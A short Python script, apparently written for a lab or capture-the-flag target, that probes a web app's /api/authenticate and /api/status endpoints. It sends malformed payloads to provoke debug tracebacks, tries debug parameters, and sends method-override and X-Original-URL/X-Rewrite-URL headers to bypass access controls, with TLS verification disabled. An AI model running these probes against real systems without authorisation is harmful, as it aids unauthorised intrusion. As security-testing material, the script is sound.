import requests
import time
import urllib3

urllib3.disable_warnings()
BASE_URL = "https://bbfbc1bf-5042-411e-86b4-29657887ee45.222.255.138.122.nip.io"
s = requests.Session()
s.verify = False

def do(desc, req_fn):
    time.sleep(3.0)
    try:
        r = req_fn()
        print(f"[{desc}] -> Status: {r.status_code}, Len: {len(r.text)}, Content-Type: {r.headers.get('Content-Type')}")
        if "traceback" in r.text.lower() or "error" in r.text.lower() or r.status_code == 500:
            print(f"    Body snippet: {r.text[:300]}")
    except Exception as e:
        print(f"[{desc}] -> Error: {e}")

print("=== 1. Thử kích hoạt 500 / Debug Traceback ===")
do("Malformed JSON", lambda: s.post(f"{BASE_URL}/api/authenticate", data='{"token": ', headers={"Content-Type": "application/json"}))
do("Content-Type XML", lambda: s.post(f"{BASE_URL}/api/authenticate", data='<xml>test</xml>', headers={"Content-Type": "application/xml"}))
do("Empty POST body with JSON header", lambda: s.post(f"{BASE_URL}/api/authenticate", data='', headers={"Content-Type": "application/json"}))
do("Array JSON", lambda: s.post(f"{BASE_URL}/api/authenticate", data='["test"]', headers={"Content-Type": "application/json"}))
do("Number JSON", lambda: s.post(f"{BASE_URL}/api/authenticate", data='12345', headers={"Content-Type": "application/json"}))
do("Null byte in body", lambda: s.post(f"{BASE_URL}/api/authenticate", data='{"token": "\x00"}', headers={"Content-Type": "application/json"}))

print("\n=== 2. Thử các method và header override trên /api/status ===")
do("POST /api/status", lambda: s.post(f"{BASE_URL}/api/status", json={"debug": True}))
do("GET /api/status?debug=1", lambda: s.get(f"{BASE_URL}/api/status?debug=1"))
do("GET /api/status?format=debug", lambda: s.get(f"{BASE_URL}/api/status?format=debug"))
do("OPTIONS /api/status", lambda: s.options(f"{BASE_URL}/api/status"))

print("\n=== 3. Thử Method Override trên /api/authenticate ===")
do("POST with X-HTTP-Method-Override: GET", lambda: s.post(f"{BASE_URL}/api/authenticate", headers={"X-HTTP-Method-Override": "GET"}))
do("POST with X-Original-URL: /api/status", lambda: s.post(f"{BASE_URL}/api/authenticate", headers={"X-Original-URL": "/api/status"}))
do("POST with X-Rewrite-URL: /api/status", lambda: s.post(f"{BASE_URL}/api/authenticate", headers={"X-Rewrite-URL": "/api/status"}))
